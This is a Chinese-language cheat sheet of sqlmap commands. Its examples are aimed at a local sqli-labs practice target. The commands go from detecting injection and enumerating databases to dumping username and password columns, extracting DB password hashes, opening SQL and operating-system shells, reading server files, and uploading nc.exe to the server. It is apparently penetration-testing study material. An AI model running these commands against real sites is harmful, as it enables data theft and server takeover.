sqlmap语法

  1. 判断是否存在注入
    sqlmap.py -u “目标URL”
    sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1"

  2. 从一个包含有WEB数据包的txt文件中加载HTTP请求，SQLMAP可以从一个文本文件中获取HTTP请求，这样就可以不设置其它参数（如cookie,POST数据等）
    sqlmap.py -r 文件路径 (-r参数一般在存在cookie注入时使用)
    sqlmap.py -r H:\下载\sqli.txt

  3. 查询当前用户下的所有数据库
    sqlmap.py -u “目标URL” –dbs
    sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1" –dbs

  4. 获取某一数据库中所有的表名
    sqlmap.py -u “目标URL” -D 数据库名 –tables
    sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1" -D security –tables

  5. 获取某一数据库中某一表下的所有字段名
    sqlmap.py -u “目标URL” -D 数据库名 -T 表名 –columns
    sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1" -D security -T users –columns

  6. 获取某一数据库中某一表下的某些字段内容
    sqlmap.py -u “目标URL” -D 数据库名 -T 表名 -C 字段名,字段名 –dump
    sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1" -D security -T users -C username,password –dump

  7. 获取某一数据库中某一表下的所有字段内容
    sqlmap.py -u “目标URL” -D 数据库名 -T 表名 –dump
    sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1" -D security -T users –dump

  8. 获取数据库的所有用户（在当前用户有权限读取包含所有用户表的权限时）
    sqlmap.py -u “目标URL” –users

  9. 获取数据库用户的密码
    sqlmap.py -u “目标URL” –passwords

  10. 获取当前网站数据库的名称
    sqlmap.py -u “目标URL” –current-db

  11. 获取当前网站的数据库的用户名称
    sqlmap.py -u “目标URL” –current-user

  12. 设置探测等级
    –level 1-5 (数字越大，探测越仔细，但同时运行速度也越慢，默认为1,GET和POST的数据在任何等级都会测试，2探测HTTP cookie,3探测HTTP User-agent/Referer头)
    ex:sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1" –level 5

  13. 检测当前用户是否为管理员权限
    –is-dba
    ex:sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1" –is-dba

  14. 列出数据库用户的角色（权限,比如update,insert,select,delete…)
    –roles
    ex:sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1" –roles

  15. 伪造HTTP中的referer头(当–level>=3时，会尝试对referer注入，此时可用该命令去进行欺骗)
    –referer url (该命令须配合–level使用)
    ex:–referer http://www.baidu.com

  16. 运行自定义SQL语句
    –sql-shell
    ex:sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1" –sql-shell

  17. 运行任意操作系统命令
    –os-cmd,–os-shell
    ex:sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1" –os-shell

  18. 从数据库服务器中读取文件(文本文件或者二进制文件)
    –file-read
    ex:sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1" –file-read “C:/nc.exe” -v 1

  19. 上传本地文件到数据库服务器中
    –file-write “本地文件路径”
    –file-dest “写入路径”
    ex:sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1" –file-write ‘C:/nc.exe’ –file-dest ‘C:/WINDOWS/Temp/nc.exe’ -v 1
